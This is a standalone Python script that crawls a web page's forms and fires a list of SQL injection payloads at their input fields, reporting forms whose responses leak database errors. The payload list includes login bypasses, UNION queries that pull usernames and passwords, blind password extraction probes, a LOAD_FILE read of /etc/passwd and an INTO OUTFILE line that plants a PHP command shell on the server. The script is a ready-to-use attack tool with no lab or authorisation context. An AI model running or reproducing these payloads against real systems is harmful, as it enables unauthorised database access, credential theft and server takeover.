
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

payloads = [
    "' OR '1'='1",
    '" OR "1"="1',
    "';--",
    '" OR ""="',
    "' OR 1=1--",
    "admin' --",
    "' OR 1=1 --",
    '" OR "" = "',
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT null,@@version,database() --",
    "' UNION SELECT 1,table_name,3 FROM information_schema.tables --",
    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --",
    "' UNION SELECT 1,username,password FROM users --",
    "' AND 1=CONVERT(int,@@version) --",
    "' OR SLEEP(5) --",
    "' OR BENCHMARK(10000000,MD5('test')) --",
    "' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version)) --",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "' OR (SELECT LOAD_FILE('/etc/passwd')) --",
    "' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[\"cmd\"]); ?>' --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97 --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%') --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)=10) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND MID(password,1,1)='a') --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND ORD(MID(password,1,1))=97) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password REGEXP '^a') --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password RLIKE '^a') --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE BINARY 'a%') --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 1) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 2) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 3) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 4) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 5) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 6) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 7) --",
    "' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%' OFFSET 8) --"
]

def find_forms(url):
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []

def form_details(form):
    details = {}
    try:
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            name = input_tag.attrs.get("name")
            type_ = input_tag.attrs.get("type", "text")
            value = input_tag.attrs.get("value", "")
            if name:
                inputs.append({"name": name, "type": type_, "value": value})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception:
        pass
    return details

def is_vulnerable(response):
    errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sql syntax",
        "ORA-00933", "ORA-00921", "Microsoft OLE DB Provider for SQL Server",
        "MySQL server version", "syntax error"
    ]
    for error in errors:
        if error.lower() in response.text.lower():
            return True
    return False

def test_sql_injection(url):
    print("[*] Testing SQL injection on forms...")
    results = []
    forms = find_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in payloads:
            data = {}
            for input_field in details.get("inputs", []):
                if input_field["type"] in ["text", "search", "email", "password"]:
                    data[input_field["name"]] = payload
                else:
                    data[input_field["name"]] = input_field["value"]
            form_url = urljoin(url, details.get("action", ""))
            try:
                if details.get("method") == "post":
                    res = requests.post(form_url, data=data, timeout=10)
                else:
                    res = requests.get(form_url, params=data, timeout=10)
                if is_vulnerable(res):
                    print(f"[!] SQL Injection detected with payload: {payload}")
                    results.append(form_url)
                    break
            except requests.exceptions.RequestException:
                continue
    print("[+] SQL injection test completed.")
    return results
